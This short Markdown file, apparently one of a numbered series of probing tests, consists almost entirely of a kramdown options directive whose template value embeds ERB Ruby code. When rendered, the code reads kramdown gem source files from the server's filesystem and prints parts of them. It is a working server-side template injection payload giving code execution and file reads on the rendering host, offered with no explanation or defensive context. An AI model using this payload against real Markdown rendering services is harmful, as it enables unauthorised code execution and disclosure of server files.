---
---

# Test 29: Read kramdown converter class method

{::options template="string://<%= r=''; begin; conv=File.read('/usr/local/bundle/gems/kramdown-2.4.0/lib/kramdown/converter.rb'); r=r+'CONVERTER='+conv[0..2000]+\"\\n\"; rescue => e; r=r+'CONV_ERR='+e.message+\"\\n\"; end; begin; base=File.read('/usr/local/bundle/gems/kramdown-2.4.0/lib/kramdown/converter/base.rb'); idx=base.index('def self.syntax_highlighter'); if idx; r=r+'SH_METHOD='+base[idx..idx+600]+\"\\n\"; else; r=r+'SH_METHOD=NOT_FOUND\\n'; idx2=base.index('syntax_highlighter'); for i in 0..5; if idx2; r=r+'SH_REF_'+i.to_s+'='+base[[idx2-30,0].max..idx2+100]+\"\\n\"; idx2=base.index('syntax_highlighter',idx2+1); end; end; end; rescue => e; r=r+'BASE_ERR='+e.message+\"\\n\"; end; begin; utils=File.read('/usr/local/bundle/gems/kramdown-2.4.0/lib/kramdown/utils.rb'); idx=utils.index('syntax_highlighter'); if idx; r=r+'UTILS_SH='+utils[[idx-30,0].max..idx+300]+\"\\n\"; end; rescue => e; r=r+'UTILS_ERR='+e.message+\"\\n\"; end; r %>" /}

placeholder
